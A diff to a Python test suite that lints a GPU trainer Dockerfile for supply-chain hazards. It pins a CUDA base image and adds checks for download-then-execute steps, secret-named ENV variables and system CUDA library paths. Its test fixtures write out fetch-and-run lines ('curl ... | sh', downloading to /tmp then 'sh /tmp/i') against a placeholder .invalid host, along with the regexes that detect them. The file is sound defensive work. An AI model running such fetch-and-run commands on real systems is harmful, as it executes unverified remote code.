@@ -134,14 +134,15 @@ def test_trainer_image_installs_only_from_the_hashed_lock_as_non_root():
     text = (GPU / "trainer.Dockerfile").read_text()
     toolchain = json.loads((ROOT / "tools/toolchain.json").read_text())
     args = dict(re.findall(r"^ARG (\w+)=(\S+)$", text, re.M))
-    assert DIGEST_REF.fullmatch(args["CUDA_RUNTIME_IMAGE"])
-    assert args["CUDA_RUNTIME_IMAGE"].startswith("docker.io/nvidia/cuda:13.0.3-runtime-")
+    assert DIGEST_REF.fullmatch(args["CUDA_BASE_IMAGE"])
+    # The base flavour carries no cuBLAS/NCCL that could shadow the locked wheels.
+    assert args["CUDA_BASE_IMAGE"].startswith("docker.io/nvidia/cuda:13.0.3-base-ubuntu24.04@")
     assert args["UV_IMAGE"] == toolchain["bootstrap_images"]["uv"]
     assert "TODO" not in text
     assert re.findall(r"^FROM (\S+)", text, re.M) == [
         "${UV_IMAGE}",
-        "${CUDA_RUNTIME_IMAGE}",
-        "${CUDA_RUNTIME_IMAGE}",
+        "${CUDA_BASE_IMAGE}",
+        "${CUDA_BASE_IMAGE}",
     ]
     python = toolchain["tools"]["python"]["artifacts"]["Linux-x86_64"]
     assert f"--checksum=sha256:{python['sha256']}" in text
@@ -164,6 +165,11 @@ def test_trainer_image_installs_only_from_the_hashed_lock_as_non_root():
 PINNED_PYTHON = "/opt/python/bin/python3.12"
 SECRET_NAME = re.compile(r"TOKEN|KEY|SECRET|PASSWORD|PASSWD|CREDENTIAL", re.I)
 PIPE_TO_SHELL = re.compile(r"\b(?:curl|wget)\b[^\n]*\|\s*(?:sudo\s+)?(?:ba|da|z|k)?sh\b")
+DOWNLOAD = re.compile(r"\b(?:curl|wget)\b")
+# A shell, `source` or `.` given a file operand, or a `./file` run, after a download in one step.
+EXECUTE_FILE = re.compile(
+    r"\b(?:ba|da|z|k)?sh\s+(?!-)\S|\bsource\s+\S|(?:^|[;&|]\s*)\.\s+\S|(?:^|[\s;&|])\./\S"
+)
 
 
 def instructions(text: str) -> list[str]:
@@ -183,6 +189,11 @@ def image_hazards(text: str) -> list[str]:
     steps = instructions(text)
     if any(PIPE_TO_SHELL.search(step) for step in steps):
         hazards.append("download_piped_to_shell")
+    for step in steps:
+        download = DOWNLOAD.search(step)
+        if download and EXECUTE_FILE.search(step, download.end()):
+            hazards.append("download_then_execute")
+            break
     # No system package is needed; any apt-get would add an unpinned, unhashed dependency.
     if any(re.search(r"\bapt(?:-get)?\b", step) for step in steps if step.startswith("RUN ")):
         hazards.append("apt_get_present")
@@ -190,12 +201,23 @@ def image_hazards(text: str) -> list[str]:
     names += [
         m for s in steps if s.startswith("ENV ") for m in re.findall(r"(?:^ENV |\s)(\w+)=", s)
     ]
+    # Legacy `ENV NAME value` form: the first operand carries no `=`.
+    names += [m.group(1) for s in steps if (m := re.match(r"^ENV (\w+)(?:\s|$)", s))]
     if any(SECRET_NAME.search(name) for name in names):
         hazards.append("secret_like_build_variable")
     export = export_command(text)
     uv_python = any(f"UV_PYTHON={PINNED_PYTHON}" in s for s in steps if s.startswith("ENV "))
     if f"--python {PINNED_PYTHON}" not in export and not uv_python:
         hazards.append("export_without_pinned_python")
+    library_paths = [
+        path
+        for s in steps
+        if s.startswith("ENV ")
+        for value in re.findall(r"(?:^ENV |\s)LD_LIBRARY_PATH=(\S+)", s)
+        for path in value.split(":")
+    ]
+    if not library_paths or any(path.startswith("/usr/local/cuda") for path in library_paths):
+        hazards.append("system_cuda_on_library_path")
     return hazards
 
 
@@ -214,24 +236,49 @@ def test_trainer_image_has_no_shell_download_apt_secret_or_unpinned_interpreter(
             "RUN mkdir -p /opt/python",
             "RUN curl -fsSL https://x.invalid/i | sh && mkdir -p /opt/python",
             "download_piped_to_shell",
-        ),  # noqa: E501
+        ),
         (
             "RUN mkdir -p /opt/python",
             "RUN wget -qO- https://x.invalid/i | bash; mkdir -p /opt/python",
             "download_piped_to_shell",
-        ),  # noqa: E501
+        ),
         (
             "RUN groupadd",
             "RUN apt-get update && apt-get install -y git && groupadd",
             "apt_get_present",
-        ),  # noqa: E501
+        ),
         ("ARG UV_IMAGE=", "ARG HF_TOKEN\nARG UV_IMAGE=", "secret_like_build_variable"),
+        (
+            "WORKDIR /home/trainer",
+            "ENV HF_TOKEN generated\nWORKDIR /home/trainer",
+            "secret_like_build_variable",
+        ),
+        (
+            "RUN mkdir -p /opt/python",
+            "RUN curl -fsSL -o /tmp/i https://x.invalid/i && sh /tmp/i && mkdir -p /opt/python",
+            "download_then_execute",
+        ),
+        (
+            "RUN mkdir -p /opt/python",
+            "RUN wget -O /tmp/i https://x.invalid/i; bash /tmp/i; mkdir -p /opt/python",
+            "download_then_execute",
+        ),
+        (
+            "RUN mkdir -p /opt/python",
+            "RUN wget -O i https://x.invalid/i && chmod +x i && ./i && mkdir -p /opt/python",
+            "download_then_execute",
+        ),
+        (
+            "LD_LIBRARY_PATH=/usr/local/nvidia/lib:/usr/local/nvidia/lib64",
+            "LD_LIBRARY_PATH=/usr/local/nvidia/lib:/usr/local/nvidia/lib64:/usr/local/cuda/lib64",
+            "system_cuda_on_library_path",
+        ),
         ("UV_LINK_MODE=copy", "UV_LINK_MODE=copy API_KEY=generated", "secret_like_build_variable"),
         (
             "PIP_NO_INDEX=1",
             "PIP_NO_INDEX=1 REGISTRY_PASSWORD=generated",
             "secret_like_build_variable",
-        ),  # noqa: E501
+        ),
     ],
 )
 def test_image_hazard_checks_reject_each_mutation(old, new, hazard):
